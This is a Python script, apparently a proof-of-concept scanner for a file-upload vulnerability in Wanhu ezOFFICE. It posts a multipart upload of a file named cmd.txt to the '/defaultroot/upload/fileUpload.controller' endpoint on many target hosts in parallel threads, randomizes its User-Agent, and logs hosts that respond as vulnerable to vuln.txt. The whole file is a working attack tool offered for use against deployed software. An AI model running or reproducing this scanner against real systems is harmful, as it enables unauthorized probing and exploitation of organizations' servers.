#coding:utf-8
import requests
import sys
import urllib3
import base64
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import re
#app="万户网络-ezOFFICE"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]


proxies={'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'}
#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

headers = {

	'User-Agent': get_ua(),
	'Content-Type': 'multipart/form-data;boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0',
	'Connection': 'Keep-Alive',
	'Accept-Encoding': 'gzip, deflate'
	}
data ='''
--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\nContent-Disposition: form-data; name="file"; filename="cmd.txt"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n123456\r\n\r\n--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--\r\n
'''

#有漏洞的url写入文件	
def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

def check_url(url):
	url=parse.urlparse(url)
	url=url.scheme + '://' + url.netloc
	url1=url + '/defaultroot/upload/fileUpload.controller'
	try:
		res1 = requests.post(url1,headers=headers,data=data,proxies=proxies, timeout=5)
		print(res1)
		#res2 = requests.get(url, verify=False, headers=headers,allow_redirects=True, timeout=5)
		if res1.status_code == 200 and "data" in res1.text:
			print("\033[32m[+]{0}  {1} \033[0m".format(url1,res1.status_code))
			wirte_targets(url1,"vuln.txt")
		else:
			print("\033[34m[-]{} not vulnerable.\033[0m".format(url))
	except Exception as e:
		print("\033[34m[!]{} request false.\033[0m".format(url))
		pass


def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_url, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	arg=ArgumentParser(description='check_url By bboy')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	print("[+]任务开始.....")
	start=time()
	if url != None and filename == None:
		check_url(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成,用时%ds.' %(end-start))